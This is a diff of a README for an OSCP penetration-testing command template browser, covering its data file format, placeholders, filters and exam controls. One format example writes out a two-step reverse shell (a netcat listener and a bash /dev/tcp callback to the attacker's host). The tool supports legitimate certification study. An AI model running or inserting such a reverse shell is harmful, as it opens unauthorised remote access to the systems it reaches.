@@ -1,176 +1,244 @@
 # OSCP Command Generator
 
-A lightweight, offline-friendly command template browser + generator for OSCP/pen-test workflows.
+A lightweight, offline-friendly command template browser + generator for
+OSCP/pen-test workflows.
 
-- Load commands from simple `.txt` files in `/data`
-- Fill placeholders (e.g. `<target>`, `<user>`, `<password>`) from the left sidebar
-- Search instantly without re-render flicker (DOM hide/show filtering)
-- Filter by **Credential**, **Non-credential**, **Priority**, and **Favorites**
-- Copy full commands (or individual steps) with one click
-- Highlight placeholders, flags, operators, and `#comments` (but not numbering like `#2`)
+-   Load commands from simple `.txt` files in `/data`
+-   Fill placeholders (e.g. `<target>`, `<user>`, `<password>`) from the
+    left sidebar
+-   Search instantly without re-render flicker (DOM hide/show filtering)
+-   Filter by **Credential**, **Non-credential**, **Priority**, and
+    **Favorites**
+-   Copy full commands (or individual steps) with one click
+-   Highlight placeholders, flags, operators, and `#comments` (but not
+    numbering like `#2`)
 
----
+------------------------------------------------------------------------
 
-## Project Structure
+## 📁 Project Structure
 
-```
-oscp-command-generator/
-├─ index.html
-├─ css/
-│  └─ style.css
-├─ data/
-│  ├─ reconnaissance.txt
-│  ├─ web.txt
-│  ├─ smb.txt
-│  └─ ...
-└─ README.md
-```
+    oscp-command-generator/
+    ├─ index.html
+    ├─ css/
+    │  └─ style.css
+    ├─ js/
+    │  └─ (modular JS files)
+    ├─ data/
+    │  ├─ 01_Network_Enumeration.txt
+    │  ├─ 02_Web_Enumeration_and_attacks.txt
+    │  ├─ ...
+    │  └─ manifest.json
+    └─ README.md
 
-> **Important:** This project expects the web server to allow directory listing for `/data/`
-so the app can discover categories automatically.
+> If using `manifest.json`, directory listing is NOT required.\
+> If not using `manifest.json`, your server must allow directory listing
+> for `/data/`.
 
----
+------------------------------------------------------------------------
 
-## Getting Started
+## 🚀 Getting Started
 
-### Option A — Quick run (recommended)
-Use a tiny local server so `fetch()` works and `/data/` can be read.
+### Option A --- Quick run (recommended)
+
+Use a tiny local server so `fetch()` works.
 
 **Python**
-```bash
+
+``` bash
 python -m http.server 8000
 ```
 
-Then open:
-- `http://localhost:8000/`
+Open:
+
+    http://localhost:8000/
 
 **Node (http-server)**
-```bash
+
+``` bash
 npx http-server -p 8000
 ```
 
-### Option B — VS Code Live Server
-1. Install “Live Server”
-2. Right-click `index.html` → **Open with Live Server**
+### Option B --- VS Code Live Server
 
----
+1.  Install "Live Server" extension\
+2.  Right-click `index.html` → **Open with Live Server**
 
-## Command File Format (`/data/*.txt`)
+------------------------------------------------------------------------
 
-Each non-empty line is one command entry:
+## 📄 Command File Format (`/data/*.txt`)
 
-```
-Title: command here
-```
+Each non-empty line represents one command entry:
 
-### Priority commands
+    Title: command here
+
+### 🔺 Priority Commands
+
 Prefix the line with `^`:
+
+    ^Nmap quick scan: nmap -sC -sV <target>
+
+If multiple lines share the same title, they are grouped into one card.
+
+If ANY line in that group is marked `^`, the entire card becomes
+Priority.
+
+------------------------------------------------------------------------
+
+### 🔢 Multi-step Commands (Automatic Grouping)
+
+If the **same title appears multiple times**, the app merges them into
+one card and treats them as multi-step:
+
+    Reverse shell: nc -lvnp <kaliPort>
+    Reverse shell: bash -i >& /dev/tcp/<kali>/<kaliPort> 0>&1
+
+Displayed as:
+
+-   Step 1
+-   Step 2
+
+Each step has its own copy button.
+
+------------------------------------------------------------------------
+
+### 💬 Comments Inside Commands
+
+You can append contextual comments using `#`:
+
+    Base64 transfer: base64 -d <filename2> > <filename1> #target-machine
+
+-   `#target-machine` will be highlighted
+-   `#2` (numbering) is NOT treated as a comment
+
+------------------------------------------------------------------------
+
+## ➕ Adding a New Category
+
+1.  Create a new `.txt` file in `/data` Example:
+
+```{=html}
+<!-- -->
 ```
-^Nmap quick scan: nmap -sC -sV <target>
+    14_Post_Exploitation.txt
+
+2.  Add commands using the required format.
+
+3.  Update `/data/manifest.json` (if used):
+
+``` json
+[
+  "01_Network_Enumeration",
+  "14_Post_Exploitation"
+]
 ```
 
-### Multi-step commands
-If the **same title appears multiple times**, the app merges them into one card and treats them as multi-step:
+> ⚠️ Do NOT include `.txt` in manifest entries.
 
-```
-Reverse shell: nc -lvnp <kaliPort>
-Reverse shell: bash -i >& /dev/tcp/<kali>/<kaliPort> 0>&1
-```
+4.  Hard refresh browser (`Ctrl + Shift + R`).
 
-These display as **Step 1 / Step 2** with individual copy buttons.
+------------------------------------------------------------------------
 
-### Comments inside commands
-You can add comments after a header or command using `#...`:
+## ➖ Removing a Category
 
-```
-Base64 transfer: base64 -d <filename2> > <filename1> #target-machine
-```
+1.  Delete the `.txt` file from `/data`
+2.  Remove its entry from `manifest.json`
+3.  Refresh browser
 
-`#target-machine` will be highlighted in a soothing accent color.
-Numbering like `#2` is **not** treated as a comment.
+------------------------------------------------------------------------
 
----
+## 🔄 Regenerating `manifest.json`
 
-## Placeholders (Tags)
+If using `create.bat`, you can regenerate `manifest.json` automatically
+from existing `.txt` files:
 
-Supported placeholders include:
+    create.bat
 
-- `<target>` Target IPv4
-- `<target6>` Target IPv6
-- `<port>` Target Port
-- `<kali>` Kali IPv4
-- `<kali6>` Kali IPv6
-- `<kaliPort>` Kali Port
-- `<user>` Username
-- `<password>` Password
-- `<domain>` Domain
-- `<dc-ip>` Domain Controller IP
-- `<ntlm>` NTLM Hash
-- `<filename1>`, `<filename2>`
-- `<wordlist1>`, `<wordlist2>`
+------------------------------------------------------------------------
 
-Open the **Help** `?` button to see the full list and click a row to focus its input.
+## 🏷 Placeholders (Tags)
 
-> The parser detects tags even in odd formatting like: `<<< <target>`
+Supported placeholders:
 
----
+-   `<target>` Target IPv4
+-   `<target6>` Target IPv6
+-   `<port>` Target Port
+-   `<kali>` Kali IPv4
+-   `<kali6>` Kali IPv6
+-   `<kaliPort>` Kali Port
+-   `<user>` Username
+-   `<password>` Password
+-   `<domain>` Domain
+-   `<dc-ip>` Domain Controller IP
+-   `<ntlm>` NTLM Hash
+-   `<filename1>`, `<filename2>`
+-   `<wordlist1>`, `<wordlist2>`
 
-## Filters
+Open the **Help (?) button** to view all tags and click to focus their
+input field.
 
-Buttons are in this order:
+------------------------------------------------------------------------
 
-1. **Credential**
-2. **Non-credential**
-3. **Priority**
-4. **Favorites**
+## 🔍 Filters
 
-### Credential vs Non-credential (mutually exclusive)
-- **Credential** = command contains **both** `<user>` **and** `<password>` in the same command/template
-- **Non-credential** = everything else
-- You **cannot select both**. Clicking one automatically deselects the other.
-- If neither is selected → **show all**
+Buttons appear in this order:
 
----
+1.  **Credential**
+2.  **Non-credential**
+3.  **Priority**
+4.  **Favorites**
 
-## Favorites
+### Credential vs Non-credential
 
-- Click `☆ / ★` on a card to favorite/unfavorite it
-- Favorites are stored in `localStorage`
+-   **Credential** = contains BOTH `<user>` and `<password>`
+-   **Non-credential** = everything else
+-   They are mutually exclusive
+-   If neither selected → show all
 
----
+------------------------------------------------------------------------
 
-## Copy Rules (Exam Controls)
+## ⭐ Favorites
 
-### Block copy if placeholders remain
-If enabled, copy buttons are disabled when required placeholders are still empty.
+-   Click `☆ / ★` to favorite
+-   Stored in `localStorage`
+-   Filter using the Favorites button
 
-### Remember non-sensitive inputs
-If enabled, the app stores non-sensitive inputs in `localStorage` (e.g. target IP, ports, filenames, wordlists).
-Passwords are **not** stored.
+------------------------------------------------------------------------
 
----
+## 🧪 Exam Controls
 
-## Keyboard Shortcuts
+### Block Copy
 
-- `/` focus Search
-- `j` / `k` move selection (when not typing in inputs)
-- `c` copy selected card (when not typing in inputs)
-- `Ctrl` + `+` / `-` / `0` font scaling
+When enabled: - Copy buttons are disabled if required placeholders are
+empty
 
-> There are **no** hotkeys for favorites/priority to avoid interrupting typing.
+### Remember Non-sensitive Inputs
 
----
+When enabled: - Stores IPs, ports, filenames, wordlists in
+`localStorage` - Passwords are NOT stored
 
-## Notes / Requirements
+------------------------------------------------------------------------
 
-- The app relies on `fetch("data/")` to list categories.
-  - This works if your server enables directory listing.
-  - If your environment does not allow directory listing, you can:
-    - Provide a `data/index.json` listing categories (future enhancement), or
-    - Hardcode categories in code.
+## ⌨️ Keyboard Shortcuts
 
----
+-   `/` → Focus search
+-   `j` / `k` → Move selection
+-   `c` → Copy selected card
+-   `Ctrl + + / - / 0` → Font scaling
+-   `Esc` → Close Help panel
 
-## License
+> No hotkeys for favorite/priority to avoid typing conflicts.
 
-Choose a license (e.g. MIT) and add it as `LICENSE`.
+------------------------------------------------------------------------
+
+## ⚙️ Notes / Requirements
+
+-   Must be served over `http://`
+-   Fully static (no backend)
+-   Works offline once loaded
+-   Safe for GitHub Pages hosting
+
+------------------------------------------------------------------------
+
+## 📜 License
+
+MIT (add `LICENSE` file to project root)
